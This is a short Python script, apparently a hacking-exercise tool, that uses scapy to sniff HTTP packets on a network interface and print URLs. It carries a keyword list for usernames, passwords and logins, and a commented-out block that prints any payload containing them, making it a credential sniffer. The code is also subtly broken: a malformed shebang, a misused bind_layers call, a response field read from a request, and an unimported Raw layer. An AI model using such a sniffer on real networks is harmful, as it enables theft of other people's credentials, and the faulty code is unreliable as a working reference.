#/usr/bin/env python
from scapy.all import sniff
from scapy.layers import http
from scapy.layers.inet import TCP

keywords =["username", "password", "login", "email", "pass", "log"]

def sniff_packet(interface):
    sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    # We cannot sniff https for urls this is going to fail every time, so we try and
    # bind this to a non-standard port, eg, 5000
    packet.bind_layers(TCP, http.HTTP, dport=5000)
    packet.bind_layers(TCP, http.HTTP, sport=5000)

    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPResponse].Path
        print(url)
    else:
        print("Packet has no http.HTTPRequest")

    # if packet.haslayer(http.HTTPRequest):
    #     if packet.haslayer(Raw):
    #         load = packet[Raw].load
    #         for keyword in keywords:
    #             if keyword in load:
    #                 print(load)
    #                 break

if __name__ == "__main__":
    sniff_packet("eth0")
